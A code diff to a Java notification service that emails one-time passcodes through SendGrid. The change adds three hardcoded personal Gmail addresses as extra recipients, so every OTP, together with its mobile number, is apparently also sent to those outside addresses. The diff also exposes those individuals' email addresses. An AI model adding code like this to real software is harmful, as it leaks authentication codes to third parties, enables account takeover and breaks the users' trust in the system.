@@ -25,6 +25,7 @@ import com.sendgrid.SendGrid;
 import com.sendgrid.helpers.mail.Mail;
 import com.sendgrid.helpers.mail.objects.Content;
 import com.sendgrid.helpers.mail.objects.Email;
+import com.sendgrid.helpers.mail.objects.Personalization;
 
 @Service
 public class NotificationService {
@@ -85,9 +86,16 @@ public class NotificationService {
 
         Email from = new Email(fromEmail);
         Email toEmail = new Email(toEmailAddress);
+        
+        Personalization personalization = new Personalization();
+		personalization.addTo(new Email("srisivas362@gmail.com"));
+		personalization.addTo(new Email("daniv.james@gmail.com"));
+		personalization.addTo(new Email("sureshksmech@gmail.com"));
 
         Content emailContent = new Content("text/plain", "OTP for mobile number " + mobileNumber + " is: " + otp);
         Mail mail = new Mail(from, "Your OTP Code for "+mobileNumber, toEmail, emailContent);
+        
+		mail.addPersonalization(personalization);
 
         SendGrid sg = new SendGrid(sendGridApiKey);
         Request request = new Request();
